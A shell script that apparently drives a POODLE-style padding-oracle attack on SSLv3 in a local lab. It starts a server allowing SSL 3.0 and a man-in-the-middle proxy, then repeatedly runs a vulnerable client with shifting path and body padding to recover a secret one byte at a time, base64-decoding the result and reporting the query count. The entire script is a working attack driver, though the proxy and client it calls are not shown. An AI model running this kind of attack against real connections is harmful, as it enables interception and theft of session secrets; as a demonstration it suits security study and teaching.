#!/bin/sh

make >/dev/null

killall flexible_server >/dev/null 2>&1
./flexible_server min_version=ssl3 server_port=5556 >/dev/null &
SRV_PID=$!

killall mitm_proxy >/dev/null 2>&1
./mitm_proxy >/dev/null 2>guesses &
PXY_PID=$!

sleep 1

P=pppppppp
B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
S=""
N=0

START=$( date +%s )

for i in $( seq 1 24 ); do
    printf "%02d... " $(( 25 - $i ))

    while true; do
        N=$(( $N + 1 ))
        if ./vulnerable_client path=$P body=$B >/dev/null; then
            break
        fi
    done
    C=$( tail -n1 guesses )
    printf "$C "

    C=$( printf "$C" | tail -c2 )
    C=$( printf '\x'"$C" )
    S="$C$S"
    printf "'$C'\n"

    P="p$P"
    B=$( printf "$B" | sed s/.// )
done

END=$( date +%s )

echo ""
echo "$S"
echo "$S" | base64 --decode
echo ""

echo ""
echo "Found secret in $N queries and $(( $END - $START )) seconds"

kill $SRV_PID
kill $PXY_PID
